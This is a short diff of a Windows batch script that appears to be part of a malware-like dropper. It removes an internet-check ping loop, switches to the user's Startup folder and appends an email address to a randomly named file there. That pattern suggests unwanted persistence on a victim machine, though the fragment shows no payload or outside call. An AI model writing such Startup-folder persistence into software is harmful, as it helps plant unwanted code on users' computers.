@@ -3,13 +3,6 @@
 set "initial_dir=%cd%"
 set "STARTUP=C:/Users/%USERNAME%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 
-:check_internet
-ping -n 1 8.8.8.8 >nul 2>&1
-if errorlevel 1 (
-    timeout /t 100 >nul
-    goto check_internet
-)
-
 cd %STARTUP%
 
 echo goat3dmofo@gmail.com >> PkUbTvqXFIdB.txt
